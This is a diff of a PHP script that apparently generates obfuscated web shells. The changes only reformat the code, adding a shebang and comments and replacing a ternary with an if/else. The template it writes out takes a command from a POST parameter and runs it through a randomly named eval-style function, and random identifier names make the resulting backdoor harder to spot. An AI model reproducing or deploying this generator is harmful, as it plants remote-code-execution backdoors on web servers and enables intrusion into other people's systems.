@@ -1,14 +1,20 @@
+#!/usr/bin/php
+
 <?php
 
-
 function make_random_name(){
+
+	// making some randomness
 	$name = rand() * rand();
 	$name = hash("whirlpool", $name);
 	$name = crypt($name);
+
 	// shorten
 	$name = preg_replace('~([\.\$/]|.{16}$)~', '', $name);
+
 	// rm leading numbers
 	$name = preg_replace('/^[0-9]+/', '', $name);
+
 	// make sure the regex didn't leave us an empty string
 	return ($name = NULL? make_random_name(): $name);
 }
@@ -59,7 +65,12 @@ function '.$_2233['eval_function'].'($'.$_2233['eval_arg'].'){
 $'.$_2233['post_command'].'=$_POST["'.$_2233['post_2233'].'"];
 echo preg_replace('."'/".$_2233['script_name']."/'".', '."basename(\$_SERVER[\"SCRIPT_NAME\"]), $".$_2233['page_html'].');
 
-isset($'.$_2233['post_command'].')? '.$_2233['eval_function'].'($'.$_2233['post_command'].') : '.$_2233['eval_function'].'('.$_2233['no_command'].')
-;?>';
+if (isset($'.$_2233['post_command'].')){
+	'.$_2233['eval_function'].'($'.$_2233['post_command'].');
+}
+else {
+	'.$_2233['eval_function'].'('.$_2233['no_command'].');
+}
+?>';
 
 ?>
